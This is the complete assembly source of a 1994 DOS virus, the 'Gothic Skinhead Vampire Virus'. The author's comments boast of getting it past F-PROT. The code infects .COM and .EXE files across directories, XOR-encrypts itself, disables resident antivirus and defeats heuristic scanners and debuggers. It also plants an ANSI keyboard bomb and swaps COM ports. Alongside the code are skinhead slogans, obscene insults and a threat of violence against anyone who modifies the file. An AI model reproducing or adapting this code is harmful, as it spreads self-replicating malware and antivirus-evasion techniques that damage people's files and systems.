;-***-***-***-***-***-***-***-***-***-***-***-***-***-***-***-***-***-***-***-
;Name:   Gothic Skinhead Vampire Virus
;Author: Abigwar
;Auth Affil: BGR and CHAOS
;Date: 6/5/94
;
;   6/5/94 Update, I picked up the new copy of F-PROT. It doesnt scan the
;   RED PLAGUE family as MSP/C. Now it says  " This is a unknown virus please
;   Send a copy to F-prot for anylise " .. Well, Here i am again... Trying
;   to make F-prot not even say that. Damn that F-prot.... Catches every
;   thing! The name is no longer RED PLAGUE, Its now The Gothic Skinhead
;   Vampire Virus [GSVV]. Quite scarry name huh? well it describes me perfect.
;   Hehe, Inside joke. This version of what was RED PLAGUE has been changed
;   by me so many times, i figure its time for a new name.
;
;   6/5/94 update #2... Well, I encoded this little baby with CRYPTCOM, and
;   and F-prot said right away "HEy man ThiS file LooKs Like MSP/C or LM 
;   BeiNg Cyphered with CRyPtCoM!" And I said "FUCK YOU!". So then i pulled
;   out a 7 foot pecker and shoved it up F-prots ass. Actually, i pulled out
;   my handy dandy PROTECT ExE/CoM file... And encoded it yet another time.
;   BINGO!! F-prot see's nothing, hears nothing, and smells like shit. Hit 
;   the hammer on its head! ;> Here is the sorce.
;
;   Ok, Bout the virus!  After its run it displays that little ANTHEM by
;   Agnostic Front.. it says theirs an error... It uses ansi to redefine
;    to say GSVV by Abigwar or something to that effect. SO they 
;   will run it, Type a command and hit enter. It will erase the command
;   they put in GSVV by abigwar or something like that. The rest, You can
;   figure out!
;
;-***-***-***-***-***-***-***-***-***-***-***-***-***-***-***-***-***-***-***-



Code    Segment Public 'Code'
        Assume  CS:Code
        Org     100h                             

ID = 'KK'                                       ;So we know where we were                              
MaxFiles = 69                                   ;Get alot!  

Start:
        db     0e9h,2,0                          
        dw     id                               ;KK 

CHAOS_Anger     db      "  daehniks a htiw ssem reven  ",0
                        
        
virus:     

                mov     dx, 5945h               ; pull CPAV (MSAV)
                mov     ax, 64001d              ; out of memory
                int     16h                     ; This also confused
                                                ; TBCLEAN 




                        eat_debug:
                                push    cs
                                pop     ds
                                mov     dx, offset eat_int
                                mov     ax,2501h
                                int     21h
                                mov     al,03h
                                int     21h
                                
                        eat_int: iret

next1:          cmp     word ptr es:[di-3],'VA'    ;*AV  i.e. cpav
                je      AV                         ;(TBAV) (MSAV)  
AV:             jmp     AV_Detected                ; must be equal

AV_Detected:      
                mov     word ptr es:[di-1], 2020h    ; Screw up the search
                mov     word ptr es:[di+1], 2020h    ; clear the .XXX
                mov     ax, 0DDDDh                   ; Flag AV
                Je      FUS

FUS:                
                call    screw_fprot              ; confusing f-protect's
                call    screw_fprot              ; heuristic scanning
                call    screw_fprot              ; Still effective as of
                call    screw_fprot              ; version 2.10
                call    screw_fprot              ;
                call    screw_fprot                
                call    screw_fprot              ;  
                call    screw_fprot              ; 
                call    screw_fprot              ;
                call    screw_fprot              ;
screw_fprot:
                jmp  $ + 2                 ;  Pseudo-nested calls to confuse
                call screw2                ;  f-protect's heuristic
                call screw2                ;  analysis
                call screw2                ;
                call screw2                ;
                call screw2                ; 
                ret                        ; 
screw2:                                    ;
                jmp  $ + 2                 ;
                call screw3                ;
                call screw3                ;
                call screw3                ;
                call screw3                ;
                call screw3                ;
                ret                        ;
screw3:                                    ;
                jmp  $ + 2                 ;
                call screw4                ;
                call screw4                ;
                call screw4                ;
                call screw4                ;
                call screw4                ;
                ret                        ;
screw4:                                    ;
                jmp  $ + 2                 ;
                ret                        ;

QQE     db    '<>$'   ;Simple text message

Virusa:
        call    realcode                         

Realcode:
        nop
        nop
        nop
        nop
        nop
        pop     bp                               
        nop
        nop
        nop
        nop
        sub     bp,offset realcode               
        nop
        nop
        nop
        nop
        call    encrypt_decrypt                  

Encrypt_Start   equ     $                        

        cmp     sp,id                            
        je      restoreEXE                       

        lea     si,[bp+offset oldjump]           
        mov     di,100h                          
        push    di                               
        movsb                                    
        movsw                                    
        movsw                                    
        jmp     exitrestore

RestoreEXE:
        push    ds                               
        push    es                               
        push    cs
        pop     ds                               
        push    cs
        pop     es                               

        lea     si,[bp+jmpsave2]
        lea     di,[bp+jmpsave]
        movsw                                    
        movsw                                    
        movsw                                    
        movsw                                    

ExitRestore:
        lea     dx,[bp+offset dta]                
        call    set_DTA                           

        mov     [bp+counter],byte ptr 0           
        mov     ax,3524h                          
        int     21h                               
        mov     word ptr [bp+oldint24],bx         
        mov     word ptr [bp+oldint24+2],es

        mov     ah,25h                            
        lea     dx,[bp+offset int24]              
        int     21h

        push    cs                                
        pop     es                                

        mov     ah,47h                            
        mov     dl,0h                             
        lea     si,[bp+offset currentdir]         
        int     21h

DirLoop:
        lea     dx,[bp+offset exefilespec]        
        call    findfirst
        lea     dx,[bp+offset comfilespec]        
        call    findfirst

        lea     dx,[bp+offset directory]          
        mov     ah,3bh                            
        int     21h
        jnc     dirloop                           

        call    activate                          

        mov     ax,2524h                          
        lds     dx,[bp+offset oldint24]           
        int     21h

        push    cs
        pop     ds                                

        lea     dx,[bp+offset currentdir]         
        mov     ah,3bh                            
        int     21h

        mov     dx,80h                            
        call    set_dta                           

        cmp     sp,id-4                           
        jz      returnEXE                         

        retn                                      

ReturnEXE:
        pop     es                                
        pop     ds                                

        mov     ax,es
        add     ax,10h
        add     word ptr cs:[bp+jmpsave+2],ax
        add     ax,word ptr cs:[bp+stacksave+2]
        cli                                       
        mov     sp,word ptr cs:[bp+stacksave]
        mov     ss,ax
        sti
        db      0eah                              
jmpsave dd      ?                                 
stacksave dd    ?                                 
jmpsave2 dd     0fff00000h
stacksave2 dd   ?

FindFirst:
        cmp    [bp+counter],maxfiles             
        ja     quit                              

        mov     ah,4eh                           
        mov     cx,7                             

FindNext:
        int     21h                              
        jc      quit                             

        call    infection                        

FindNext2:
        mov     ah,4fh                           
        jmp     findnext                         

Quit:
        ret

Infection:
        mov     ax,3d00h                         
        call    open

        mov     ah,3fh                           
        mov     cx,1ah                           
        lea     dx,[bp+offset buffer]            
        int     21h

        mov     ah,3eh                           
        int     21h

        mov     ax,word ptr [bp+DTA+1Ah]         
        cmp     ax,50000                         
        ja      quitinfect                       

        cmp     ax,500                           
        jb      quitinfect                       

        cmp     word ptr [bp+buffer],'ZM'        
        jz      checkEXE                         
        mov     ax,word ptr [bp+DTA+35]          
        cmp     ax,'DN'                          
        jz      quitinfect                       

CheckCom:
        mov     bx,word ptr [bp+offset dta+1ah]  
        cmp     word ptr cs:[bp+buffer+3],id      ; Check for ID 'KK'
        je      quitinfect

        jmp     infectcom

CheckExe:
        cmp     word ptr [bp+buffer+10h],id      
        jz      quitinfect                       
        jmp     infectexe

QuitInfect:
        ret

InfectCom:
        sub     bx,3                             
        lea     si,[bp+buffer]                   
        lea     di,[bp+oldjump]
        movsb
        movsw
        movsw
        mov     [bp+buffer],byte ptr 0e9h        
        mov     word ptr [bp+buffer+1],bx        

        mov     word ptr [bp+buffer+3],id        
        mov     cx,5                             

        jmp     finishinfection
InfectExe:
        les     ax,dword ptr [bp+buffer+14h]     
        mov     word ptr [bp+jmpsave2],ax        
        mov     word ptr [bp+jmpsave2+2],es

        les     ax,dword ptr [bp+buffer+0eh]     
        mov     word ptr [bp+stacksave2],es      
        mov     word ptr [bp+stacksave2+2],ax

        mov     ax, word ptr [bp+buffer+8]       
        mov     cl,4
        shl     ax,cl
        xchg    ax,bx
        les     ax,[bp+offset DTA+26]            
        mov     dx,es                            
        push    ax                               
        push    dx

        sub     ax,bx                            
        sbb     dx,0                             
        mov     cx,10h                           
        div     cx

        mov     word ptr [bp+buffer+14h],dx      
        mov     word ptr [bp+buffer+16h],ax      

        mov     word ptr [bp+buffer+0eh],ax      
        mov     word ptr [bp+buffer+10h],id      
        pop     dx                               
        pop     ax

        add     ax,eof-virus                     
        adc     dx,0                             

        mov     cl,9                             
        push    ax
        shr     ax,cl
        ror     dx,cl
        stc
        adc     dx,ax
        pop     ax
        and     ah,1

        mov     word ptr [bp+buffer+4],dx        
        mov     word ptr [bp+buffer+2],ax

        push    cs                               
        pop     es

        mov     cx,1ah                           
FinishInfection:
        push    cx                               
        xor     cx,cx                            
        call    attributes

        mov     al,2                             
        call    open

        mov     ah,40h                           
        lea     dx,[bp+buffer]                   
        pop     cx                               
        int     21h
        jc      closefile

        mov     al,02                            
        Call    move_fp

get_time:
        mov     ah,2ch                           
        int     21h
        cmp     dh,0                             
        je      get_time
        mov     [bp+enc_value],dh                

        call    encrypt_infect                   

        inc     [bp+counter]                     

CloseFile:
        mov     ax,5701h                         
        mov     cx,word ptr [bp+dta+16h]         
        mov     dx,word ptr [bp+dta+18h]         
        int     21h

        mov     ah,3eh                           
        int     21h

        xor     cx,cx
        mov     cl,byte ptr [bp+dta+15h]          
        call    attributes

        retn

Activate:
        mov     ah,2ah                            
        int     21h

        cmp     al,5                              
        jb      dont_activate

        mov     ah,9                              
        lea     dx,[bp+messege]                   
        int     21h


Dont_Activate:
        ret

Move_Fp:
        mov     ah,42h                            
        xor     cx,cx                             
        xor     dx,dx                             
        int     21h
        retn

Set_DTA:
        mov     ah,1ah                            
        int     21h                               
        retn

Open:
        mov     ah,3dh                            
        lea     dx,[bp+DTA+30]                    
        int     21h
        xchg    ax,bx                             
        ret

Attributes:
        mov     ax,4301h                          
        lea     dx,[bp+DTA+30]                    
        int     21h
        ret                                  

int24:                                            
        mov     al,3                              
        iret                                      
;-------
;Data
Virusname db 'Gothic Vampire! '                           ;Virus Name
Author    db 'Made by Abigwar '                           ;Author
messege:                        

          db  '  Changes that were hardly noticed',10,13
          db  '  Until time itself became a chain',10,13
          db  '  Once hot blood began to cool    ',10,13
          db  '  My ever slowing heart--beat in vain',10,13
          db  '  From the nightmare I wake in another dream',10,13
          db  '  And stare at an unbroken sky',10,13
          db  '  Try to distill a cure for the plague',10,13
          db  '  Thats put to rest everything--I once felt inside',10,13
          db  '  To never again be bound by United Blood',10,13
          db  '  A sense of purpose lost forever more',10,13
          db  '  Is this the way I will die?  No!',10,13
          db  '  I will find the sense of honor--that I held once before',10,13
          db  '  The Blood--The Honor--The Truth',10,13
          db  '  Thought it would never end',10,13
          db  '  The Blood--The Honor--The Truth',10,13
          db  '  Can be part of our lives again',10,13
          db '��',10,13
          db 'There may have been an error.',10,13          ;See me when executed
          db 'Please make sure you have ANSI.SYS loaded!',10,13
;****************************************************************************          
; This part is important! if you look, You will notice that its an ANSI          
; Redefined code... THIS MEANS I PUT AN ANSI BOMB INSIDE AN .EXE file
; I never knew it was possible. Yippe! It turns the victoms  key
; off so that when they hit enter it says after it erases what they typed:
; Gothic Skinhead Vampire Virus by: ABiGWAR! [BGR]          
          
          db '[13;" Gothic Skinhead Vampire Virus by: ABiGWAR! [BGR]"p$',10,13
;****************************************************************************

NewDaT:
          db 'New Jersey Glory Hammer Skinheads',10,13          ;We where here
          db 'If the kids are united they will never be divided!',10,13 ;duh
          db 'Gothic Skinhead Vampire Virus',10,13                  ;We where here      
          db 'Made by Abigwar',10,13                 ;me was here
Made_with db '[1994]-[Oi!]-[Havok Productions]',10,13,'$' ;We where here                   
;-------
;Print that message! "May have been an error" 2 Printer       
        int     5h 
;-------
;Shoot Phasor
; CX=Number of shots (5)
phasor:                                        ;Zap Zap Zap Zap Zap
        mov     cx,5
        push    cx

        cli
        mov     dx,12000
        sub     dx,cs:5000
        mov     bx,100
        mov     al,10110110b
        out     43h,al
backx:
        mov     ax,bx
        out     42h,al
        mov     al,ah
        out     42h,al
        in      al,61h
        mov     ah,0
        or      ax,00000011b
        out     61h,al
        inc     bx
        mov     cx,15
loopx:
        loop    loopx
        dec     dx
        cmp     dx,0
        jnz     backx
        in      al,61h
        and     al,11111100b
        out     61h,al
        sti
        pop     cx
        loop    phasor

comfilespec  db  '*.com',0         ;Look for me     
exefilespec  db  '*.exe',0         ;Look for me     
directory    db '..',0             ;Move me     
oldjump      db  0cdh,020h,0,0,0        
;-------
;  This swaps two com ports.
;  BX=First com port.  (1)
;  SI=Second Com Port. (2)
        MOV     BX,1                    ;Com1
        MOV     Si,2                    ;Com2
        push    es                      ; Save ES
        xor     ax,ax                   ; Set the extra segment to
        mov     es,ax                   ; zero (ROM BIOS)
        shl     bx,1                    ; Convert to word index
        shl     si,1                    ; Convert to word index
        mov     ax,word ptr [bx + 03FEh]; Zero COM port address
        xchg    word ptr [si + 03FEh],ax; Put first value in second,
        mov     word ptr [bx + 03FEh],ax; and second value in first!
        pop     es                      ; Restore ES


Encrypt_Infect:
        lea     si,[bp+offset move_begin]
        lea     di,[bp+offset workarea]  
        mov     cx,move_end-move_begin   
move_loop:
        movsb                            
        loop    move_loop
        lea     dx,[bp+offset workarea]
        call    dx                       
        ret

Move_Begin    equ     $                  
        push    bx                       
        lea     dx,[bp+offset encrypt_end]
        call    dx                                
        pop     bx                               
        mov     ah,40h                           
        mov     cx,eof-virus                     
        lea     dx,[bp+offset virus]             
        int     21h
        push    bx                               
        lea     dx,[bp+offset encrypt_end]
        call    dx                               
        pop     bx                               
        ret
move_end      equ     $                          

Encrypt_End   equ     $                          

Encrypt_Decrypt:
        mov     ah,cs:[bp+enc_value]             
        lea     si,cs:[bp+encrypt_start]         
        mov     cx,encrypt_end-Encrypt_start     
encloop:
        xor     cs:[si],ah
        inc     si
        loop    encloop
        ret

Enc_Value     db    00h                          
                                        ;Screen Drop Starts here
Row            dw   24                  ;Rows to do.
                mov     dx, 5945h                
                mov     ax, 64001d               
                int     16h                      

Starta:        mov  cx,0B800h      
               mov  ah,15          
               int  10h
               cmp  al,2           
               je   A2             
               cmp  al,3           
               je   A2             
               cmp  al,7           
               je   A1             
               int  20h            

                                   
A1:            mov  cx,0A300h 
A2:            mov  bl,0      
               add  cx,bx     
               mov  ds,cx     

                              
               xor  bx,bx     
A3:            push bx        
               mov  bp,80     
                              
A4:            mov  si,bx     
               mov  ax,[si]   
               cmp  al,20h    
               je   A7        
               mov  dx,ax     
               mov  al,20h 
               mov  [si],ax
               add  si,160 
               mov  di,cs:Row      
A5:            mov  ax,[si]        
               mov  [si],dx        
A6:            call Vert           
               mov  [si],ax        
                                   
              add  si,160          
              dec  di              
              jne  A5              
              mov  [si-160],dx     
                                   
A7:           add  bx,2            
              dec  bp              
              jne  A4              
;Do next row.
A8:           pop  bx              
              add  bx,160          
              dec  cs:Row          
              jne  A3              
A9:           mov  ax,4C00h  
              int  21h             

                                   
Vert:         push ax
              push dx
              push cx              
              mov  cl,2            
              mov  dx,3DAh         
F1:           in   al,dx           
              test al,8            
              je   F1              
              dec  cl              
              je   F3              
F2:           in   al,dx           
              test al,8            
              jne  F2              
              jmp  F1              
F3:           pop  cx
              pop  dx
              pop  ax              
              ret                  
        
        mov     Bx,1
        mov     Si,2
        push    es                      
        xor     ax,ax                   
        mov     es,ax                   
        shl     bx,1                    
        shl     si,1                    
        mov     ax,word ptr [bx + 03FEh]
        xchg    word ptr [si + 03FEh],ax
        mov     word ptr [bx + 03FEh],ax
        pop     es                      

blast   equ    ax
EOF     equ     $                      

ENEMENMIN equ  2                       ;
Blood_dat equ  666                     ;
Police    equ  21                      ;
Brutality equ  12                      ;
Rough_sex equ  21                      ;
North_DAK Equ  112                     ;
Jism      equ   3                      ;These are to confuse debuggers
Hot_mess  equ  43                      ;They dont mean anything
CUNT_Drip EQU  69                      ;See CHAOS i6a5 For more info
pussy_lip equ  666                     ;
Counter db 0                                 
Workarea db     move_end-move_begin dup (?)  
currentdir db   64 dup (?)                   
DTA     db      42 dup (?)                   
Buffer db 1ah dup (?)                        
OldInt24 dd ?                                

eov     equ     $                            

code    ends
        end     start


;                       AFTERWORD
; If i find out any of you pussys changes this or put your name on it i will
; Crucify you. I cant take 100% credit for this file. I got some of the
; rutines from IVP and VCL... And i got the DROP routine from a nice person
; on TEKAT... I forget who. SORRY!
;
;       Greets:
;               By Group:
;                       BGR  UXU
;                       HCH  YAM
;                       AA   and any i forgot
;                       CDC

; Fuck you's:
;       Mike Mac Phail [Poser skinhead]
;       Warren Hills Jocks that try to get into the Underground:
;                                       The     WARLOCK


;Abigwar '94 or die!
